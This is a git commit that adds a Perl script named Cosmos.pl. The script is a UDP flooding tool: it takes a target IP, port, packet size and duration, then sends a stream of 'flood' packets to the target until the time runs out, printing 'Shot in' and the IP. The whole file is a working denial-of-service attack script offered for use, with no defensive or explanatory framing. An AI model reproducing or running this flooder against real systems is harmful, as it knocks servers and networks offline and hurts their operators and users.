86eeab35222214a6ce056e345bd018de464e0f2b
Michael <86857592+alshenv@users.noreply.github.com>
2023-02-01 20:50:11 +0100

    Update and rename Cosmos.pl.txt to Cosmos.pl

---
+++ Cosmos.pl
@@ -0,0 +1,26 @@
+use Term::ANSIColor qw(:constants);
+    $Term::ANSIColor::AUTORESET = 2;
+    
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "The server name could not be found $ip\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print BOLD BLUE<<EOTEXT;
+	Shot in $ip
+EOTEXT
+
+
+ 
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1500000-64)+64) ;
+  $pport = $port ? $port : int(rand(1500000))+1;
+ 
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
+$iaddr));}
